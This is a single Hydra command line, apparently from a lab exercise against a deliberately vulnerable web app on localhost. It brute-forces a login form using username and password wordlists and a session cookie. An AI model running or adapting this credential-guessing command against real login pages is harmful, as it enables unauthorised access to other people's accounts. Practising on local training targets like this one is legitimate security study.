hydra -L <username.txt> -P <passwords.txt> localhost -s 8880 http-get-form
"/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=83ohku3mgeqaj3n6o42bionm80; security=low:F=Username and/or password
incorrect"